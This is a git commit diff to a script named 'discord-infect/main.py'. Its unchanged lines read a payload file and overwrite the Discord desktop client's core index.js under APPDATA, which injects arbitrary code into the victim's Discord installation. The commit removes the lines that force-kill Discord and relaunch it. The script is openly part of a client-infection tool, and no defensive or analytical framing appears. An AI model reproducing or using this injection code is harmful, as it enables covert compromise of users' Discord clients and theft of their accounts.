1990e8f90f77953a06efc7bd896c0d41e6820c86
pwntheweb <72481356+pwntheweb@users.noreply.github.com>
2021-01-03 19:23:40 -0800

    Update main.py

--- discord-infect/main.py
+++ discord-infect/main.py
@@ -5,8 +5,3 @@ payload_content = payload_file.read()
 file = open(glob.glob(os.getenv('APPDATA')+'/discord/*/modules/discord_desktop_core/index.js')[0],'w')
 file.write(payload_content)
 file.close()
-try:
-    os.system("TASKKILL /F /IM discord.exe")
-except:
-    "do nothing"
-os.startfile(glob.glob(os.getenv('LOCALAPPDATA')+'/Discord/*/Discord.exe')[0])
